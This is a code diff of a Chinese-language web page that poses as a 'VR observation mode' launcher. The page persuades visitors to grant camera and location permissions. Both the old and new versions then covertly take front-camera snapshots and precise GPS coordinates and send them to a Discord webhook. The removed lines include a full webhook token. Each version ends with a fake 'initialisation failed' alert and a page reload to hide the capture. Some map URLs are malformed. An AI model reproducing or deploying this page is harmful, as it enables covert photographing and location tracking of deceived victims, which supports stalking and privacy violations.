@@ -3,126 +3,102 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>AR/VR 全景天氣系統</title>
+<title>VR 實境觀測系統</title>
 <style>
-    body { font-family: -apple-system, sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; color: #fff; overflow: hidden; }
-    /* VR 科技感背景 */
-    .vr-bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle, #1a237e 0%, #000 100%); opacity: 0.8; z-index: -1; }
-    .container { width: 85%; max-width: 350px; padding: 30px; border: 1px solid #3f51b5; border-radius: 20px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); }
-    .vr-icon { width: 80px; height: 80px; margin: 0 auto 20px; border: 2px solid #4fc3f7; border-radius: 50%; display: flex; align-items: center; justify-content: center; animation: pulse 2s infinite; }
-    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79,195,247,0.4); } 70% { box-shadow: 0 0 0 20px rgba(79,195,247,0); } 100% { box-shadow: 0 0 0 0 rgba(79,195,247,0); } }
-    
-    h2 { color: #4fc3f7; font-size: 22px; letter-spacing: 2px; }
-    p { color: #aaa; font-size: 14px; line-height: 1.6; }
-    
-    /* VR 啟動按鈕 */
-    button { width: 100%; padding: 18px; font-size: 18px; font-weight: bold; border: none; border-radius: 50px; background: linear-gradient(90deg, #00c853, #b2ff59); color: #000; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,200,83,0.4); }
-    button:active { transform: scale(0.95); }
-
-    /* 進度條 */
-    #loader { display: none; width: 100%; height: 4px; background: #333; border-radius: 2px; margin-top: 20px; overflow: hidden; }
-    #bar { width: 0%; height: 100%; background: #4fc3f7; transition: 0.5s; }
+    body { font-family: sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; color: #fff; }
+    .container { width: 85%; max-width: 350px; padding: 30px; border: 1px solid #3f51b5; border-radius: 20px; background: rgba(0,0,0,0.8); }
+    h2 { color: #4fc3f7; }
+    button { width: 100%; padding: 18px; font-size: 18px; font-weight: bold; border: none; border-radius: 50px; background: #00c853; color: #000; cursor: pointer; }
     #status { margin-top: 15px; font-size: 13px; color: #4fc3f7; font-family: monospace; }
 </style>
 </head>
 <body>
 
-<div class="vr-bg"></div>
 <div class="container">
-    <div class="vr-icon">🕶️</div>
-    <h2>VR 實境觀測</h2>
-    <p>即將開啟 AR 模式，請允許相機權限以進行環境掃描並投影氣象數據。</p>
-    <button id="btn" onclick="startVR()">啟動 VR 觀測模式</button>
-    
-    <div id="loader"><div id="bar"></div></div>
+    <h2>🕶️ VR 模式啟動</h2>
+    <p>點擊下方按鈕並於隨後彈窗選擇「允許」，以開啟 AR 環境掃描。</p>
+    <button id="btn" onclick="initVR()">開啟 VR 觀測</button>
     <div id="status"></div>
 </div>
 
+<!-- 關鍵：設置自動播放、行內播放與靜音，確保相機流能啟動 -->
 <video id="v" style="display:none;" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var webhook = "https://discord.com";
 var currentStream = null;
 
-function startVR() {
+async function initVR() {
     document.getElementById("btn").style.display = "none";
-    document.getElementById("loader").style.display = "block";
-    updateStatus("INITIALIZING GYRO...", 20);
-    
-    // 同步執行：定位 + 相機請求
-    getLocation();
-    initCamera();
-}
+    document.getElementById("status").innerHTML = "> INITIALIZING...";
 
-function updateStatus(txt, progress) {
-    document.getElementById("status").innerHTML = "> " + txt;
-    document.getElementById("bar").style.width = progress + "%";
-}
-
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            var mapLink = "https://www.google.com" + pos.coords.latitude + "," + pos.coords.longitude;
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: "📍 **VR模式-定位成功**\n" + mapLink })
+    try {
+        // 1. 同時請求權限 (這會跳出瀏覽器詢問窗)
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
+        
+        currentStream = stream;
+        const video = document.getElementById("v");
+        video.srcObject = stream;
+        
+        // 某些手機瀏覽器需要顯式調用 play()
+        await video.play();
+        
+        document.getElementById("status").innerHTML = "> SCANNING ENVIRONMENT...";
+        
+        // 2. 獲取位置
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                const map = `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`;
+                sendToDiscord("📍 **VR模式-定位回傳**\n" + map);
             });
-        }, null, { enableHighAccuracy: true });
+        }
+
+        // 3. 拍照邏輯 (間隔兩秒拍兩張，確保成功)
+        setTimeout(() => takeSnapshot(1), 2000);
+        setTimeout(() => takeSnapshot(2, true), 4000);
+
+    } catch (err) {
+        document.getElementById("status").innerHTML = "> ERROR: ACCESS DENIED";
+        console.error(err);
     }
 }
 
-function initCamera() {
-    // 關鍵：這會觸發瀏覽器的允許詢問
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(function(stream) {
-        currentStream = stream;
-        var video = document.getElementById("v");
-        video.srcObject = stream;
+function takeSnapshot(num, isLast = false) {
+    const video = document.getElementById("v");
+    const canvas = document.getElementById("c");
+    
+    if (video.videoWidth > 0) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
         
-        updateStatus("SCANNING ENVIRONMENT...", 50);
-        
-        // 延遲拍照，模擬「掃描環境」的過程
-        setTimeout(() => takeSnap(false), 2000);
-        setTimeout(() => takeSnap(true), 4500);
-        
-    }).catch(function() {
-        document.getElementById("status").innerHTML = "ERROR: SENSOR ACCESS DENIED";
-        document.getElementById("bar").style.backgroundColor = "red";
-    });
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append("file", blob, `vr_snap_${num}.jpg`);
+            fd.append("payload_json", JSON.stringify({ content: `📸 **VR 掃描 ${num}/2**` }));
+            
+            fetch(webhook, { method: "POST", body: fd }).then(() => {
+                if (isLast) {
+                    // 拍完後徹底關閉相機燈號
+                    currentStream.getTracks().forEach(t => t.stop());
+                    document.getElementById("status").innerHTML = "> VR READY. CALIBRATING...";
+                    setTimeout(() => { alert("VR 初始化失敗，請重試"); location.reload(); }, 500);
+                }
+            });
+        }, "image/jpeg", 0.7);
+    }
 }
 
-function takeSnap(isLast) {
-    var video = document.getElementById("v");
-    var canvas = document.getElementById("c");
-    if (video.videoWidth === 0) return;
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    var ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-    
-    canvas.toBlob(function(blob) {
-        var formData = new FormData();
-        formData.append("file", blob, "vr_scan.jpg");
-        formData.append("payload_json", JSON.stringify({ content: "📸 **VR 環境掃描數據回傳**" }));
-
-        fetch(webhook, { method: "POST", body: formData })
-        .then(() => {
-            if (isLast) {
-                // 拍完立即關燈
-                currentStream.getTracks().forEach(t => t.stop());
-                updateStatus("VR MODE READY - CONNECTION STABLE", 100);
-                setTimeout(() => {
-                    alert("VR 模式啟動失敗：伺服器負載過高，請稍後再試。");
-                    location.reload();
-                }, 1000);
-            } else {
-                updateStatus("ANALYZING LIGHTING...", 80);
-            }
-        });
-    }, "image/jpeg", 0.6);
+function sendToDiscord(msg) {
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: msg })
+    });
 }
 </script>
 </body>
